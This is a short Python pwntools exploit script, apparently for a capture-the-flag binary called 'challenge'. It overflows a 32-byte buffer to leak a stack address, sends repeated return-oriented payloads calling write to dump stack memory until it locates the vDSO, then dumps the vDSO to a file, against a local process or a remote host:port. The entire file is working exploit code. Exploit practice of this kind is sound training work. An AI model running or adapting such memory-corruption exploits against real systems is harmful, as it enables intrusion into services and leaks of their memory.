#!/usr/bin/env python3

from pwn import context, p64, remote, sys, u64


context.binary = 'challenge'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


io = get_process()

io.sendafter(b'Welcome!\n', b'A' * 0x20)
stack_addr = (u64(io.recv()[0x30:0x38]) & ~0xfff) + 0x1000
io.info(f'Stack address: {hex(stack_addr)}')


def find_vdso(haystack):
    for i in range(0, len(haystack), 8):
        addr = u64(haystack[i : i + 8].ljust(8, b'\0'))

        if addr >> 36 == stack_addr >> 36 == 0x7ff and addr & 0xfff == 0 and addr > stack_addr:
            return addr


stack = b''
offset = 0

while not (vdso_addr := find_vdso(stack)):
    payload  = b'A' * 0x20 + p64(context.binary.sym.write)
    payload += p64(0x401094) + p64(0x1800) + p64(stack_addr - offset)
    io.send(payload)
    offset += 0x1800
    stack += io.recvuntil(b'Welcome!\n', drop=True)

io.success(f'vDSO address: {hex(vdso_addr)}')

payload  = b'A' * 0x20 + p64(context.binary.sym.write)
payload += p64(0x401094) + p64(0x2000) + p64(vdso_addr)
io.send(payload)
io.recvn(0x80)

with open('vdso', 'wb') as f:
    f.write(io.recvuntil(b'Welcome!\n', drop=True))
